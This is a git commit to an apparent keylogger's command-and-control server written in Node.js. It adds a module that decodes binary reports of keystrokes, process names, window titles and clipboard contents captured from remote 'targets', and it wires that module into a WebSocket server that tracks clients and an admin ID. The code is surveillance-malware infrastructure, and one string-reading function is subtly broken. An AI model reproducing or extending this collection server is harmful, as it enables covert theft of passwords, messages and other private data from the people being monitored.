f9c6437d15d948c871c4a525888051d3d4b8320c
Sergiy Varakuta <flood.code@gmail.com>
2016-02-28 15:43:19 +0200

    Added lrcdata-reader

---
+++ lrcdata-reader.js
@@ -0,0 +1,163 @@
+﻿function readLRCData(buffer) {
+    var header = readHeader(buffer);
+    if (header == null) {
+        // Cannot read header
+        // LRCData file is damaged
+        return { ok: false, message: 'Unable to read LRCData header' };
+    }
+    
+    var result = {};
+    result.ok = true;
+    result.id = header.id;
+    result.type = header.type;
+    result.data = null;
+    
+    try {
+        var rawData = new Buffer(header.length);
+        buffer.copy(rawData, 0, 0x0048, buffer.length);
+        switch (header.type) {
+            case 0x0:
+                // Error
+                result.data = readError(rawData);
+                break;
+            case 0x1:
+                // Keyboard
+                result.data = readKeyboard(rawData);
+                break;
+            case 0x2:
+                // Clipboard
+                result.data = readClipboard(rawData);
+                break;
+            default:
+                // Unknown type
+                return { ok: false, message: 'Unknown type \'' + header.type + '\'' };
+                break;
+        }
+    } catch (ex) {
+        return { ok: false, message: 'Exception: ' + ex.message };
+    }
+    
+    if (result.data == null) {
+        return { ok: false, message: 'Can\'t parse data' };
+    }
+    
+    return result;
+}
+
+function readHeader(buffer) {
+    // Buffer length should be at least 0x0048 (size of header)
+    if (buffer.length < 0x0048) {
+        return null;
+    }
+    
+    // Read header values
+    var result = {};
+    result.signature = buffer.readUInt16BE(0x0000);
+    result.version = buffer.readInt8(0x0002);
+    result.id = buffer.toString('ascii', 0x0003, 0x0043);
+    result.type = buffer.readInt8(0x0043);
+    result.length = buffer.readUInt32BE(0x0044);
+    
+    // If length of data block is wrong
+    if (buffer.length - 0x0048 != result.length) {
+        return null;
+    }
+    
+    return result;
+}
+
+function readError(buffer) {
+    var code = buffer.readUInt32BE(0);
+    var message = readString(buffer, 4);
+    return { code: code, message: message };
+}
+
+function readKeyboard(buffer) {
+    var offset = 0x0;
+    var count = buffer.readUInt32BE(offset);
+    offset += 4;
+    
+    var items = [];
+    for (var i = 0; i < count; i++) {
+        var kbdInfo = {};
+        
+        kbdInfo.subtype = buffer.readInt8(offset);
+        offset += 1;
+        
+        switch (kbdInfo.subtype) {
+            case 0x1:
+                // VKInfo
+                var vkInfo = readVKInfo(buffer, offset);
+                offset = vkInfo.offset;
+                kbdInfo.vkInfo = vkInfo.data;
+                break;
+            case 0x2:
+                // WNDInfo
+                var wndInfo = readWNDInfo(buffer, offset);
+                offset = wndInfo.offset;
+                kbdInfo.wndInfo = wndInfo.data;
+                break;
+            default:
+                // Unknown subtype
+                return null;
+        }
+        
+        items.push(kbdInfo);
+    }
+    
+    return { count: count, items: items };
+}
+
+function readClipboard(buffer) {
+    var offset = 0x0;
+    var count = buffer.readUInt32BE(offset);
+    offset += 4;
+    
+    var items = [];
+    for (var i = 0; i < count; i++) {
+        var time = buffer.readUInt32BE(offset);
+        offset += 4;
+        var wndInfo = readWNDInfo(buffer, offset);
+        offset = wndInfo.offset;
+        var data = readString(buffer, offset);
+        offset = data.offset;
+        items.push({ time: time, wndInfo: wndInfo.data, data: data.data });
+    }
+    
+    return { count: count, items: items };
+}
+
+function readVKInfo(buffer, offset) {
+    var vkInfo = {};
+    vkInfo.data = {};
+    vkInfo.data.keyCode = buffer.readUInt32BE(offset);
+    vkInfo.data.lang = buffer.readUInt16BE(offset + 4);
+    vkInfo.data.flags = buffer.readInt8(offset + 6);
+    vkInfo.offset = offset + 7;
+    return vkInfo;
+}
+
+function readWNDInfo(buffer, offset) {
+    var process = readString(buffer, offset);
+    var title = readString(buffer, process.offset);
+    
+    var wndInfo = {};
+    wndInfo.data = {};
+    wndInfo.data.process = process.data;
+    wndInfo.data.title = title.data;
+    wndInfo.offset = title.offset;
+    return wndInfo;
+}
+
+function readString(buffer, offset) {
+    var length = buffer.readUInt32BE(offset);
+    
+    result = {};
+    result.data = buffer.toString(offset + 4, offset + 4 + length);
+    result.offset = offset + 4 + length;
+    return result;
+}
+
+module.exports.read = function (buffer) {
+    return readLRCData(buffer);
+}
--- server.js
+++ server.js
@@ -3,6 +3,7 @@ var adminID = '8f51dfd14221bc7d6adaefdf0533bf9e2af2d21e1395c6085fdf76943734c271'
 var clients = [];
 var targets = [];
 var WebSocketServer = require('ws').Server;
+var LRCDataReader = require('./lrcdata-reader.js');
 
 //Database config
 var mysql      = require('mysql');
@@ -154,125 +155,15 @@ function connection(ws) {
     );
 }
 
-function getData (id,type) {
-    clients[id].send(type);
-}
-/*
-var fs = require('fs');
-
-fs.readFile('clipboard.bin', function (err, data) {
-    parse_binary_message(data);
-});*/function parse_binary_message (data) {
-    if (data.length < 0x0048) {
-        console.log('[ERROR]Binary length incorect!');
-        return false;
-    }
-    var offset = 0x0048;
-
-    var message = {};
-
-    message['count'] = data.readUInt32BE(offset);
-    offset += 4;
-
-    message['parts'] = [];
-
-    var header = parse_binary_header(data);
-
-    switch (header['type']) {
-        case 0x0:
-            break;
-        case 0x1:
-            message['parts'] = read_keyboard(data);
-            break;
-        case 0x2:
-            message['parts'] = read_clipboard(data);
-            break;
-        default:
-            break;
-    }
-
-    function read_keyboard () {
-        var arr = [];
-        for(var i = 0; i < message['count']; i++ ) {
-            var partObj = {};
-            partObj['subtype'] = data.readInt8(offset);
-            offset += 1;
-            switch (partObj['subtype']) {
-                case 0x1:
-                    partObj['keyCode'] = data.readUInt32BE(offset);
-                    offset += 4;
-                    partObj['lang'] = data.readUInt16BE(offset);
-                    offset += 2;
-                    partObj['flags'] = data.readInt8(offset);
-                    offset += 1;
-                    break;
-                case 0x2:
-                    //read wndinfo
-                    var stringObj = read_string();
-                    partObj['process'] = stringObj['data'];
-                    offset = stringObj['offset'];
-
-                    stringObj = read_string();
-                    partObj['title'] = stringObj['data'];
-                    offset = stringObj['offset'];
-                    break;
-                default:
-                    break;
-            }
-            arr.push(partObj);
-        }
-        return arr;
-    }
-    function read_clipboard () {
-        var arr = [];
-        for (i = 0; i < message['count']; i++){
-            var partObj = {};
-            partObj['time'] = data.readUInt32BE(offset);
-            offset +=4;
-
-            //read wndinfo
-            var stringObj = read_string();
-            partObj['process'] = stringObj['data'];
-            offset = stringObj['offset'];
-
-            stringObj = read_string();
-            partObj['title'] = stringObj['data'];
-            offset = stringObj['offset'];
-
-            //read data
-            stringObj = read_string();
-            partObj['data'] = stringObj['data'];
-            offset = stringObj['offset'];
-            //push one of part
-            arr.push(partObj);
-        }
-        return arr;
-    }
-    function read_string () {
-        var result = {};
-        var length = data.readUInt32BE(offset);
-        offset += 4;
-        result['data'] = data.toString('ascii', offset, offset + length);
-        result['offset'] = offset + length;
-        return result;
-    }
-    var lrcdata = {};
-    lrcdata['header'] = header;
-    lrcdata['data'] = message;
-
-    console.log(lrcdata);
-    console.log("----------------------------");
-    console.log(message);
-}
-
-function parse_binary_header (input) {
-    var headerObj = {};
-    headerObj['signature'] = input.readUInt16BE(0);
-    headerObj['version'] = input.readInt8(0x0002);
-    headerObj['id'] = input.toString('ascii', 0x0003, 0x0042);
-    headerObj['type'] = input.readInt8(0x0043);
-    headerObj['length'] = input.readUInt32BE(0x0044);
-    return headerObj;
+function parse_binary_message (data) {
+	var lrcdata = LRCDataReader.read(data);
+	
+	if (lrcdata.ok) {
+		console.log(lrcdata.data.items);
+	} else {
+		console.log('[ERROR]Can\'t parse LRCData');
+	}
+	
 }
 
 /*
